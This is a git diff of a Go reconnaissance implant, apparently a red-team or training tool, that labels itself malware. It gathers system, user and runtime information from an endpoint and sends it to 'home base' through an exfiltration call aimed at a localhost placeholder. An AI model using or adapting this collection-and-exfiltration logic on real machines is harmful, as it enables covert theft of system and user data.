@@ -1,17 +1,20 @@
 package main
 
 import (
-	"fmt"
 	"encoding/json"
+	"fmt"
+	"io/ioutil"
+	"net/http"
 	"os"
 	"os/user"
 	"runtime"
-	"github.com/zcalusic/sysinfo"
-
-	"net/http"
 	"strings"
-	"io/ioutil"
+	"embed"
+	"github.com/zcalusic/sysinfo"
 )
+
+//go:embed imprint.txt
+var fd embed.FS
 
 func collectInfo() string {
 	returnString := "================= SYSINFO =================\n"
@@ -81,13 +84,13 @@ func Use(vals ...interface{}) {
 
 func main(){
 	// Imprint string for malware identification
-    // let imprint_string = md5sum(Engineer's Name:Favorite TCG Card)
+	// let imprint_string = md5sum(Engineer's Name:Favorite TCG Card)
 	// kali@kali~:$ echo 'an00b:yoggsaron' | md5sum
 	// 	f4b76de3b87463baa926ecd58fdbcb69
-	imprint := "f4b76de3b87463baa926ecd58fdbcb69"
+	imprint, _ := fd.ReadFile("imprint.txt")
 	Use(imprint)
 
-	fmt.Println("[!] Beep boop, I am rusty-recon-bot! I will collect information from this endpoint and send it back to home base.")
+	fmt.Println("[!] Beep boop, I am gopher-recon-bot! I will collect information from this endpoint and send it back to home base.")
 	returnString := collectInfo()
 	exfilInfo(returnString, "http://127.0.0.1")
 	fmt.Println("[*] All done! Goodbye!")
